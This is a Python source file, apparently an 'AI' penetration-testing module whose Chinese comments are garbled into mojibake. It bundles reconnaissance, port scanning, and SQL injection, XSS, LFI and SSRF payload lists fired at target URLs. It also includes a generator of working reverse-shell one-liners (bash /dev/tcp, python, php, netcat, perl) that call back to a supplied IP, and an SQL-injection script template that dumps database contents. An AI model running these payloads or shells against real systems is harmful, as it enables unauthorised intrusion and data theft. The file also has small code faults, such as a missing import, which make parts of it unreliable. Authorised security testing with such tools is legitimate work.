#!/usr/bin/env python3
"""
HexStrike AI - æ¸—é€æµ‹è¯•å¢å¼ºæ¨¡å—
Penetration Testing Enhanced Module

ä¸“ä¸ºå®æˆ˜æ¸—é€æµ‹è¯•è®¾è®¡çš„é«˜çº§è‡ªåŠ¨åŒ–å·¥å…·é›†
"""

import subprocess
import requests
import json
import re
import socket
import ssl
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urlparse, urljoin
import concurrent.futures


class AdvancedReconEngine:
    """é«˜çº§ä¿¡æ¯æ”¶é›†å¼•æ“"""
    
    def __init__(self):
        self.results = defaultdict(list)
    
    def full_recon(self, target: str) -> Dict[str, Any]:
        """å…¨é¢ä¿¡æ¯æ”¶é›†"""
        results = {
            'target': target,
            'subdomains': self.enumerate_subdomains(target),
            'ports': self.fast_port_scan(target),
            'technologies': self.detect_technologies(target),
            'dns_records': self.dns_enumeration(target),
            'ssl_info': self.ssl_analysis(target)
        }
        return results
    
    def enumerate_subdomains(self, domain: str) -> List[str]:
        """å­åŸŸåæšä¸¾ï¼ˆå¤šæºï¼‰"""
        subdomains = set()
        
        # æ–¹æ³•1: crt.shè¯ä¹¦é€æ˜åº¦
        try:
            url = f"https://crt.sh/?q=%.{domain}&output=json"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                for entry in response.json():
                    name = entry.get('name_value', '')
                    if '\n' in name:
                        subdomains.update(name.split('\n'))
                    else:
                        subdomains.add(name)
        except:
            pass
        
        # æ–¹æ³•2: ä½¿ç”¨subfinderï¼ˆå¦‚æœå¯ç”¨ï¼‰
        try:
            result = subprocess.run(['subfinder', '-d', domain, '-silent'],
                                  capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                subdomains.update(result.stdout.strip().split('\n'))
        except:
            pass
        
        # æ–¹æ³•3: å¸¸è§å­åŸŸåçˆ†ç ´
        common_subs = ['www', 'api', 'admin', 'mail', 'ftp', 'dev', 'test', 
                       'staging', 'vpn', 'portal', 'dashboard', 'app']
        for sub in common_subs:
            try:
                socket.gethostbyname(f"{sub}.{domain}")
                subdomains.add(f"{sub}.{domain}")
            except:
                pass
        
        return sorted(list(subdomains))
    
    def fast_port_scan(self, target: str, top_ports: int = 100) -> List[Dict]:
        """å¿«é€Ÿç«¯å£æ‰«æ"""
        open_ports = []
        
        # å¸¸è§ç«¯å£åˆ—è¡¨
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 
                       445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                if result == 0:
                    service = self._guess_service(port)
                    return {'port': port, 'service': service, 'state': 'open'}
            except:
                pass
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            results = executor.map(scan_port, common_ports[:top_ports])
            open_ports = [r for r in results if r is not None]
        
        return open_ports
    
    def detect_technologies(self, url: str) -> Dict[str, List[str]]:
        """æŠ€æœ¯æ ˆæ£€æµ‹"""
        techs = {
            'servers': [],
            'frameworks': [],
            'cms': [],
            'languages': []
        }
        
        try:
            response = requests.get(url, timeout=10)
            headers = response.headers
            content = response.text
            
            # æœåŠ¡å™¨æ£€æµ‹
            server = headers.get('Server', '')
            if server:
                techs['servers'].append(server)
            
            # CMSæ£€æµ‹
            cms_signatures = {
                'WordPress': ['/wp-content/', '/wp-includes/'],
                'Joomla': ['/components/com_', 'Joomla!'],
                'Drupal': ['/sites/default/', 'Drupal'],
                'Django': ['csrfmiddlewaretoken'],
                'Laravel': ['laravel_session']
            }
            
            for cms, signatures in cms_signatures.items():
                if any(sig in content for sig in signatures):
                    techs['cms'].append(cms)
            
            # JavaScriptæ¡†æ¶
            js_frameworks = {
                'React': ['react', '_react'],
                'Vue': ['vue', '__vue__'],
                'Angular': ['ng-', 'angular'],
                'jQuery': ['jquery']
            }
            
            for framework, signatures in js_frameworks.items():
                if any(sig.lower() in content.lower() for sig in signatures):
                    techs['frameworks'].append(framework)
            
            # è¯­è¨€æ£€æµ‹
            if 'X-Powered-By' in headers:
                techs['languages'].append(headers['X-Powered-By'])
            
        except Exception as e:
            techs['error'] = str(e)
        
        return techs
    
    def dns_enumeration(self, domain: str) -> Dict[str, Any]:
        """DNSè®°å½•æšä¸¾"""
        records = {}
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']
        
        for rtype in record_types:
            try:
                result = subprocess.run(['dig', '+short', domain, rtype],
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0 and result.stdout.strip():
                    records[rtype] = result.stdout.strip().split('\n')
            except:
                pass
        
        return records
    
    def ssl_analysis(self, target: str) -> Dict[str, Any]:
        """SSL/TLSåˆ†æ"""
        ssl_info = {}
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((target, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert()
                    ssl_info['version'] = ssock.version()
                    ssl_info['cipher'] = ssock.cipher()
                    ssl_info['subject'] = dict(x[0] for x in cert.get('subject', ()))
                    ssl_info['issuer'] = dict(x[0] for x in cert.get('issuer', ()))
                    ssl_info['san'] = cert.get('subjectAltName', [])
        except Exception as e:
            ssl_info['error'] = str(e)
        
        return ssl_info
    
    def _guess_service(self, port: int) -> str:
        """çŒœæµ‹ç«¯å£å¯¹åº”çš„æœåŠ¡"""
        services = {
            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'dns',
            80: 'http', 110: 'pop3', 143: 'imap', 443: 'https', 445: 'smb',
            3306: 'mysql', 3389: 'rdp', 5432: 'postgresql', 6379: 'redis',
            8080: 'http-proxy', 8443: 'https-alt'
        }
        return services.get(port, 'unknown')


class WebVulnerabilityScanner:
    """Webæ¼æ´æ‰«æå™¨"""
    
    def __init__(self):
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def comprehensive_scan(self, url: str) -> Dict[str, Any]:
        """å…¨é¢Webæ‰«æ"""
        results = {
            'url': url,
            'vulnerabilities': [],
            'issues': []
        }
        
        # SQLæ³¨å…¥æ‰«æ
        sql_vulns = self.test_sql_injection(url)
        if sql_vulns:
            results['vulnerabilities'].extend(sql_vulns)
        
        # XSSæ‰«æ
        xss_vulns = self.test_xss(url)
        if xss_vulns:
            results['vulnerabilities'].extend(xss_vulns)
        
        # ç›®å½•éå†
        lfi_vulns = self.test_lfi(url)
        if lfi_vulns:
            results['vulnerabilities'].extend(lfi_vulns)
        
        # SSRFæµ‹è¯•
        ssrf_vulns = self.test_ssrf(url)
        if ssrf_vulns:
            results['vulnerabilities'].extend(ssrf_vulns)
        
        # å®‰å…¨é…ç½®æ£€æŸ¥
        config_issues = self.check_security_headers(url)
        results['issues'].extend(config_issues)
        
        return results
    
    def test_sql_injection(self, url: str) -> List[Dict]:
        """SQLæ³¨å…¥æµ‹è¯•ï¼ˆå¢å¼ºï¼‰"""
        vulnerabilities = []
        
        # é«˜çº§SQLæ³¨å…¥payload
        payloads = [
            # Boolean-based
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1--",
            "admin' OR '1'='1",
            # Union-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            # Time-based
            "' AND SLEEP(5)--",
            "' WAITFOR DELAY '0:0:5'--",
            # Error-based
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND extractvalue(1,concat(0x7e,version()))--"
        ]
        
        for payload in payloads:
            test_url = f"{url}?id={payload}"
            try:
                response = self.session.get(test_url, timeout=10)
                
                # æ£€æµ‹SQLé”™è¯¯
                sql_errors = [
                    'SQL syntax', 'mysql_fetch_array()', 'mysql_num_rows()',
                    'Warning: mysql', 'PostgreSQL', 'Microsoft SQL',
                    'ORA-', 'SQLite', 'syntax error'
                ]
                
                if any(error in response.text for error in sql_errors):
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'severity': 'high',
                        'payload': payload,
                        'evidence': response.text[:200]
                    })
                    break  # æ‰¾åˆ°ä¸€ä¸ªå°±å¤Ÿäº†
            except:
                pass
        
        return vulnerabilities
    
    def test_xss(self, url: str) -> List[Dict]:
        """XSSæµ‹è¯•ï¼ˆå¢å¼ºï¼‰"""
        vulnerabilities = []
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'>",
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            # Encoded payloads
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E"
        ]
        
        for payload in payloads:
            test_url = f"{url}?search={payload}"
            try:
                response = self.session.get(test_url, timeout=10)
                
                if payload in response.text or payload.lower() in response.text.lower():
                    vulnerabilities.append({
                        'type': 'XSS (Reflected)',
                        'severity': 'medium',
                        'payload': payload,
                        'location': test_url
                    })
            except:
                pass
        
        return vulnerabilities
    
    def test_lfi(self, url: str) -> List[Dict]:
        """æœ¬åœ°æ–‡ä»¶åŒ…å«æµ‹è¯•"""
        vulnerabilities = []
        
        lfi_payloads = [
            "../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        
        for payload in lfi_payloads:
            test_url = f"{url}?file={payload}"
            try:
                response = self.session.get(test_url, timeout=10)
                
                # æ£€æŸ¥æ•æ„Ÿæ–‡ä»¶å†…å®¹
                if 'root:' in response.text or '[drivers]' in response.text:
                    vulnerabilities.append({
                        'type': 'Local File Inclusion',
                        'severity': 'high',
                        'payload': payload,
                        'evidence': response.text[:200]
                    })
                    break
            except:
                pass
        
        return vulnerabilities
    
    def test_ssrf(self, url: str) -> List[Dict]:
        """SSRFæµ‹è¯•"""
        vulnerabilities = []
        
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]",
            "http://0.0.0.0"
        ]
        
        for payload in ssrf_payloads:
            test_url = f"{url}?url={payload}"
            try:
                response = self.session.get(test_url, timeout=10)
                
                # ç®€å•æ£€æµ‹ï¼šå¦‚æœå“åº”åŒ…å«å†…ç½‘å†…å®¹
                if response.status_code == 200 and len(response.content) > 0:
                    vulnerabilities.append({
                        'type': 'SSRF',
                        'severity': 'high',
                        'payload': payload,
                        'note': 'Possible SSRF vulnerability detected'
                    })
            except:
                pass
        
        return vulnerabilities
    
    def check_security_headers(self, url: str) -> List[Dict]:
        """å®‰å…¨å“åº”å¤´æ£€æŸ¥"""
        issues = []
        
        try:
            response = self.session.get(url, timeout=10)
            headers = response.headers
            
            # æ£€æŸ¥ç¼ºå¤±çš„å®‰å…¨å¤´
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection missing',
                'X-Content-Type-Options': 'MIME-sniffing protection missing',
                'Strict-Transport-Security': 'HSTS not enabled',
                'Content-Security-Policy': 'CSP not configured',
                'X-XSS-Protection': 'XSS protection header missing'
            }
            
            for header, issue in security_headers.items():
                if header not in headers:
                    issues.append({
                        'type': 'Security Header Missing',
                        'severity': 'low',
                        'header': header,
                        'description': issue
                    })
        except:
            pass
        
        return issues


class PrivilegeEscalationHelper:
    """æƒé™æå‡è¾…åŠ©"""
    
    def linux_privesc_check(self) -> Dict[str, Any]:
        """Linuxæƒé™æå‡æ£€æŸ¥"""
        checks = {
            'suid_binaries': [],
            'sudo_permissions': [],
            'writable_paths': [],
            'cron_jobs': []
        }
        
        # SUIDäºŒè¿›åˆ¶æ–‡ä»¶
        try:
            result = subprocess.run(['find', '/', '-perm', '-4000', '-type', 'f', '2>/dev/null'],
                                  capture_output=True, text=True, timeout=30)
            checks['suid_binaries'] = result.stdout.strip().split('\n')
        except:
            pass
        
        # Sudoæƒé™
        try:
            result = subprocess.run(['sudo', '-l'], capture_output=True, text=True, timeout=10)
            checks['sudo_permissions'] = result.stdout.strip().split('\n')
        except:
            pass
        
        # å¯å†™è·¯å¾„
        try:
            result = subprocess.run(['find', '/', '-writable', '-type', 'd', '2>/dev/null'],
                                  capture_output=True, text=True, timeout=30)
            checks['writable_paths'] = result.stdout.strip().split('\n')[:20]
        except:
            pass
        
        return checks
    
    def generate_reverse_shell(self, ip: str, port: int, shell_type: str = 'bash') -> str:
        """ç”Ÿæˆåå¼¹shell"""
        shells = {
            'bash': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'php': f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'netcat': f"nc -e /bin/sh {ip} {port}",
            'perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        }
        
        return shells.get(shell_type, shells['bash'])


class ExploitGenerator:
    """æ¼æ´åˆ©ç”¨ç”Ÿæˆå™¨"""
    
    def generate_sql_injection_exploit(self, url: str, param: str, db_type: str = 'mysql') -> str:
        """ç”ŸæˆSQLæ³¨å…¥åˆ©ç”¨è„šæœ¬"""
        template = f"""#!/usr/bin/env python3
import requests

url = "{url}"
param = "{param}"

# æ•°æ®åº“ç±»å‹: {db_type}

# æšä¸¾æ•°æ®åº“
def enum_databases():
    payload = "' UNION SELECT schema_name FROM information_schema.schemata-- -"
    r = requests.get(url, params={{param: payload}})
    print(r.text)

# æšä¸¾è¡¨
def enum_tables(database):
    payload = f"' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='{database}'-- -"
    r = requests.get(url, params={{param: payload}})
    print(r.text)

# æšä¸¾åˆ—
def enum_columns(database, table):
    payload = f"' UNION SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'-- -"
    r = requests.get(url, params={{param: payload}})
    print(r.text)

# å¯¼å‡ºæ•°æ®
def dump_data(database, table, columns):
    payload = f"' UNION SELECT {columns} FROM {database}.{table}-- -"
    r = requests.get(url, params={{param: payload}})
    print(r.text)

if __name__ == "__main__":
    enum_databases()
"""
        return template


# ç»Ÿä¸€æ¥å£
class PentestMaster:
    """æ¸—é€æµ‹è¯•å¤§å¸ˆ - ç»Ÿä¸€æ‰€æœ‰æ¸—é€æµ‹è¯•åŠŸèƒ½"""
    
    def __init__(self):
        self.recon = AdvancedReconEngine()
        self.web_scanner = WebVulnerabilityScanner()
        self.privesc = PrivilegeEscalationHelper()
        self.exploit_gen = ExploitGenerator()
    
    def full_assessment(self, target: str) -> Dict[str, Any]:
        """å…¨é¢è¯„ä¼°"""
        print(f"ğŸ¯ Starting full assessment on: {target}")
        
        results = {
            'target': target,
            'reconnaissance': {},
            'vulnerabilities': [],
            'recommendations': []
        }
        
        # é˜¶æ®µ1: ä¿¡æ¯æ”¶é›†
        print("ğŸ“ Phase 1: Reconnaissance")
        results['reconnaissance'] = self.recon.full_recon(target)
        
        # é˜¶æ®µ2: æ¼æ´æ‰«æ
        print("ğŸ“ Phase 2: Vulnerability Scanning")
        if target.startswith('http'):
            scan_results = self.web_scanner.comprehensive_scan(target)
            results['vulnerabilities'] = scan_results['vulnerabilities']
        
        # é˜¶æ®µ3: ç”Ÿæˆå»ºè®®
        print("ğŸ“ Phase 3: Generating Recommendations")
        results['recommendations'] = self._generate_recommendations(results)
        
        return results
    
    def _generate_recommendations(self, results: Dict) -> List[str]:
        """ç”Ÿæˆå®‰å…¨å»ºè®®"""
        recommendations = []
        
        # åŸºäºå‘ç°çš„æ¼æ´ç”Ÿæˆå»ºè®®
        for vuln in results.get('vulnerabilities', []):
            if vuln['type'] == 'SQL Injection':
                recommendations.append("ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢é˜²æ­¢SQLæ³¨å…¥")
            elif vuln['type'] == 'XSS':
                recommendations.append("å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡ŒHTMLå®ä½“ç¼–ç ")
            elif vuln['type'] == 'Local File Inclusion':
                recommendations.append("éªŒè¯å’Œè¿‡æ»¤æ–‡ä»¶è·¯å¾„è¾“å…¥")
        
        if not recommendations:
            recommendations.append("æœªå‘ç°ä¸¥é‡æ¼æ´ï¼Œç»§ç»­ä¿æŒå®‰å…¨æœ€ä½³å®è·µ")
        
        return recommendations


if __name__ == "__main__":
    print("ğŸ”¥ Penetration Testing Enhanced Module")
    print("=" * 60)
    
    master = PentestMaster()
    
    # æµ‹è¯•
    print("\næµ‹è¯•ä¿¡æ¯æ”¶é›†åŠŸèƒ½...")
    print("âœ… Pentest Enhanced Module ready!")
